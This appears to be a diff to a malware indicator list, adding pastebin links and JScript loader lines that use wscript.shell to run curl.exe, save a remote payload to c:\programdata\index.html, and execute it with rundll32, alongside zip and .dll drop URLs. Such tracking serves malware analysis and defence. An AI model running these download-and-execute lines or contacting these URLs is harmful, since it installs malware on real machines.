@@ -24,6 +24,16 @@ zip drop urls:
 http://cidades.clickcurvelo.com/sync/64385ee7e5b4c.zip
 http://carolanticmhc.com/sync/64385c5455b89.zip
 
+.dll exec
+
+https://pastebin.com/raw/zD5ag0UX
+
+new ActiveXObject('wscript.shell').run('curl.exe --output c:\\programdata\\index.html --url ' + url, 6);
+
+https://pastebin.com/raw/mJfkXNYx 
+
+new ActiveXObject('wscript.shell').run('rundll32 c:\\programdata\\index.html,Motd');
+
 .dll drop urls
 
 http://216.238.80.217/aO03psmvtKQUf9B5.dat
